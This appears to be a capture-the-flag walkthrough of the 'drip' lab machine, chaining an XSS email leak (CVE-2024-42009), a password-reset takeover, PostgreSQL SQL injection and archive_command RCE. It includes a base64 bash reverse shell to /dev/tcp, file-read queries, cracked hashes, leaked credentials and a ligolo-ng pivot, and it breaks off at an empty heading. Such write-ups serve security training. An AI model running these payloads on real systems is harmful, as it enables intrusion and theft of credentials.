# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.232.7
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:07 +0100
Nmap scan report for 10.129.232.7
Host is up (0.014s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

## Nmap
```python
nmap -p 22,80 -A --min-rate=2000 -sT 10.129.232.7    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:09 +0100
Nmap scan report for 10.129.232.7
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# SSH (22)
## Auth method
```python
ssh root@10.129.232.7                                     
The authenticity of host '10.129.232.7 (10.129.232.7)' can't be established.
ED25519 key fingerprint is: SHA256:JNw/rUlpDzlUEzvKKKFQ/M4prRH35ZhHammHWv47SkY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.7' (ED25519) to the list of known hosts.
root@10.129.232.7's password:
```

Password based auth

# HTTP (80)

The website points at the domain `drip.htb`

![](Pasted%20image%2020260904171628.png)

The sign in link takes me to `mail.drip.htb`

![](Pasted%20image%2020260904172715.png)



![1049](Pasted%20image%2020260904172910.png)

There is also a register function on the page

Just as i thought registering an accout allows me to logon to the dripmail instance

![](Pasted%20image%2020260904173332.png)

I am now logged in 

![](Pasted%20image%2020260904173358.png)

Found the version info 

![](Pasted%20image%2020260904173820.png)

Also found a potential user

This version of several different CVEs

# CVE-2024-42009

https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

https://medium.com/@zaid.zrf/practical-exploitation-of-cve-2024-42009-using-docker-and-swaks-124ac0bad911

https://algora.io/claims/28piVn5uYiQzf8b4

https://github.com/DaniTheHack3r/CVE-2024-42009-PoC?utm_source=chatgpt.com

I can use the contact form on the `http://drip.htb` page to send the email, interestingly if i proxy the request it lets me change the recipient, so ill create a victim account and begin trying the some payloads and testing them there

![](Pasted%20image%2020260904183549.png)

```python
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(1) foo=bar">Foo</body>
```

Ive sent a simple alert payload, to the victim user and it mentions another user `bcase@drip.htb` 

https://github.com/Bhanunamikaze/CVE-2024-42009/blob/main/exploit.py

Ill try this POC script

```python
python3 exploit.py -fu ethan@drip.htb -tu bcase@drip.htb -u http://drip.htb/contact -ip 10.10.14.61 -p 80
[*] CVE-2024-42009 PoC: Listening on 10.10.14.61:80...


[+] Captured Email Content:
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.

[+] Captured Email Content:
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks

[+] Captured Email Content:

^C
[!] Stopping...
```

As seen here it allows me to exfil the users emails. It gives me info on another subdomain

# `dev-a3f1-01` subdomain

![785](Pasted%20image%2020260904184544.png)

The leaked email tells me ill  have to reset my password before logging in!

![790](Pasted%20image%2020260904184807.png)

Ill use the forgot password feature and send an email to bcase which i can then leak that email once again

![](Pasted%20image%2020260904185010.png)

Ive sent the reset request and using the POC i can dump the link

Using this link i can reset the password for `bcase`, ive changed the password to `password`

`bcase:password` gets me access to the dashboard

![](Pasted%20image%2020260904185431.png)

There is an analytics dashboard which i can use to see the other users

![](Pasted%20image%2020260904185545.png)

Using a `'` in the search function on the analytics endpoint i get a SQL error, this is likely vulnerable to SQL injection

This error tells me its using postgresql as a backend database

# SQL injection on analytics subdomain

```python
sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs

...[SNIP]...

[19:08:49] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.22.1, WordPress
back-end DBMS: PostgreSQL
[19:08:50] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[19:08:50] [INFO] fetching database (schema) names
[19:08:50] [INFO] fetching number of databases
[19:08:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[19:08:50] [INFO] retrieved: 3
[19:08:51] [INFO] retrieved: 
[19:08:51] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[19:08:51] [INFO] retrieved: 
[19:08:51] [INFO] retrieved: 
[19:08:52] [INFO] falling back to current database
[19:08:52] [INFO] fetching current database
[19:08:52] [INFO] retrieved: public
[19:08:55] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
available databases [1]:
[*] public
```

I have managed to the dump the database name, i can now dump its contents

```python
sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs --dbms=postgresql -D public --schema

Database: public
Table: Users
[6 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| email       | varchar |
| host_header | varchar |
| id          | int4    |
| ip_address  | varchar |
| password    | varchar |
| username    | varchar |
+-------------+---------+

Database: public
Table: Admins
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| email    | varchar |
| id       | int4    |
| password | varchar |
| username | varchar |
+----------+---------+
```

There are two tables in this DB

However i cannot dump the contents of either table

![](Pasted%20image%2020260907190228.png)

I am able to get SQLi to work through stacked queries

![](Pasted%20image%2020260907190724.png)

I can get the path of the config file, using this i should be able to get its output

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf', 0, 2000);
```

![](Pasted%20image%2020260907190933.png)

I can get the contents of the file, however this is only the first part of the file, i will continue reading through this

Using this same query i should be able to access other files on the system too

```python
''; SELECT pg_read_file('/etc/passwd', 0, 2000);
```

![](Pasted%20image%2020260907191041.png)

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
```

Using this query i can read the full config file

Having a read through the full output i see `archive_mode` is enabled, which should allow RCE

![](Pasted%20image%2020260907191835.png)

As seen here it is on, if i can append a command to the `archive_command` parameter, it will execute it after the postgresql flushes its logs

# Reverse shell on linux server

https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3

So ill follow this article to try and get RCE

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
```

Rather getting the LOID of the file then using that to output it, ill just use this copy the contents to my machine and modify the command parameter

```python
echo 'bash -i &>/dev/tcp/10.10.14.61/1337 <&1' | base64
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==
```

Ill encode my command

```python
archive_command = 'echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==" | base64 -d | bash'
```

Then ill append it to the file

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Ill start a listener

Now the next step is to overwrite the current config with my malicious one

```python
cat postgesql.conf | base64 -w 0 | xclip -selection clipboard
```

Ill cat the malicious conf file then base64 encode its output and disable word wrap, then copy to clipboard

```python
SELECT lo_from_bytea(12345, decode('<base64 contents>', 'base64'))
```

![](Pasted%20image%2020260907195348.png)

This has loaded the new contents into the LOID 12345 and base64 decoded it

```python
SELECT lo_export(12345, '/etc/postgresql/15/main/postgresql.conf')
```

![](Pasted%20image%2020260907195449.png)

Now the file should be exported

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
```

![](Pasted%20image%2020260907200202.png)

I can now re run my original command and see my config is there

```python
''; SELECT pg_reload_conf()
''; SELECT pg_switch_wal()
```

![](Pasted%20image%2020260907200555.png)

I now have a shell on the system

# Privilege escalation

```python
postgres@drip:/var/www/html/dashboard$ cat .env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
postgres@drip:/var/www/html/dashboard$ 
```

I have found a password, this is shown in a connection string for another DB user

![](Pasted%20image%2020260907203334.png)

Running linpeas i found some interesting GPG files

```python
postgres@drip:/var/backups/postgres$ gpg --decrypt dev-dripmail.old.sql.gpg | tee /tmp/dev-dripmail.old.sql

...[SNIP]...

COPY public."Admins" (id, username, password, email) FROM stdin;
1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb

COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
5001	support	d9b9ecbf29db8054b21f303072b37c4e	support@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
5002	bcase	1eace53df87b9a15a37fdc11da2d298d	bcase@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
5003	ebelford	0cebd84e066fd988e89083879e88c5f9	ebelford@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
```

Ill load these into hashcat

```python
victor.r:cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
ebelford:8bbd7f88841b4223ae63c8848969be86:ThePlague61780
```

Two of the hashes cracked, however ebelford is the only user with a logon here

# Access as `ebelford`

```python
ssh ebelford@drip.htb
ebelford@drip.htb's password: 
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
Last login: Mon Sep  7 13:45:42 2026 from 172.16.20.1
ebelford@drip:~$
```

I now have access as this user

```python
ebelford@drip:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
ebelford@drip:~$
```

Ill have a look at the internal network, since this machine is supposed to be a AD machine, so im assuming this is doman joined

There is also a keytab file, which i need to be root to read

```python
ebelford@drip:~$ ping 172.16.20.2   
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=0.768 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=128 time=0.764 ms
^C
--- 172.16.20.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 0.764/0.766/0.768/0.002 ms
ebelford@drip:~$ ping 172.16.20.1
PING 172.16.20.1 (172.16.20.1) 56(84) bytes of data.
64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=0.559 ms
64 bytes from 172.16.20.1: icmp_seq=2 ttl=128 time=0.508 ms
^C
--- 172.16.20.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1032ms
rtt min/avg/max/mdev = 0.508/0.533/0.559/0.025 ms
ebelford@drip:~$ 
```

I can ping two more hosts here

However is stops at `.4`

```python
ebelford@drip:~$ cat /etc/hosts
127.0.0.1	localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
ebelford@drip:~$
```

I can also check `/etc/hosts` and i see `.1` is the DC

Not sure what `.2` is as of yet

I will setup a proxy to access the internal network

# Setting up ligolo-ng to access internal network

So to start ill download the latest release of the linux agent and linux proxy

```python
sudo ./proxy -selfcert           
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.1

ligolo-ng »
```

Ill start the proxy on my machine

Ill use scp to transfer the agent to the target

```python
scp agent ebelford@drip.htb:/tmp/
```

This transferred it to the target

```python
ebelford@drip:/tmp$ chmod +x agent
ebelford@drip:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.61:11601"
```

Ill then send the connection back

```python
ligolo-ng » session
? Specify a session : 1 - ebelford@drip - 10.129.232.7:58262 - 00155d840302
[Agent : ebelford@drip] » 
[Agent : ebelford@drip] » 
[Agent : ebelford@drip] » ifcreate --name ligolo
INFO[0115] Creating a new ligolo interface...           
INFO[0115] Interface created!                           
[Agent : ebelford@drip] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
└──────────────┴─────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ eth0                           │
│ Hardware MAC │ 00:15:5d:84:03:02              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.20.3/24                 │
└──────────────┴────────────────────────────────┘
[Agent : ebelford@drip] » route_add --name ligolo --route 172.16.20.0/24
INFO[0194] Route created.                               
[Agent : ebelford@drip] » tunnel_start 
INFO[0205] Starting tunnel to ebelford@drip (00155d840302) 
[Agent : ebelford@drip] »  
```

Then ill attach to the session make the new interface and add the routing info, then finally start the tunnel

```python
ping 172.16.20.2
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=49.3 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=43.3 ms
64 bytes from 172.16.20.2: icmp_seq=3 ttl=64 time=48.2 ms
```

I can now ping the internal network

```python
nxc smb 172.16.20.0/24                                                       
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

I can now enumerate both of these hosts 

# Nmap on internal network






